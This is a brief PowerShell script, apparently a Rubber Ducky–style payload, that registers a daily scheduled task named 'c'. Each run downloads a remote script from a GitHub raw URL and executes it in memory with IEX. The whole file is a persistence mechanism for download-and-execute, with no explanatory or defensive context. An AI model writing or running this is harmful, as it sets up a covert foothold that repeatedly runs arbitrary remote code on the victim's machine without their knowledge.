$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Luigit12/rubduck/master/what.ps1');'

$trigger = New-ScheduledTaskTrigger -Daily -At 11:00

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "c"